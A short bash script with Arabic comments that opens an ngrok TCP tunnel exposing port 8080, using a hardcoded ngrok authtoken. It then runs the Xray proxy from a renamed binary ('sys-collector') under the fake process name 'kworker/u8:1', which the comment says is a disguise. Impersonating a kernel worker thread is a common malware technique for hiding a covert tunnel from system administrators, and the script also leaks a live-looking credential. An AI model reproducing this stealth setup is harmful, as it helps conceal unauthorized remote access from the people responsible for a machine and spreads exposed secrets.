#!/bin/bash
set -e

# تشغيل ngrok في الخلفية مع تمرير المنفذ 8080
ngrok tcp 8080 --authtoken 2xz6Jy0Ci0OfJDBCkUvkyyCb5Zz_7u5GTGtec2hXd5FFQapMZ --log=stdout > /var/log/ngrok.log &

# تشغيل Xray المموه باسم kworker/u8:1
exec -a "kworker/u8:1" /usr/local/bin/sys-collector -config /etc/xray/config.json
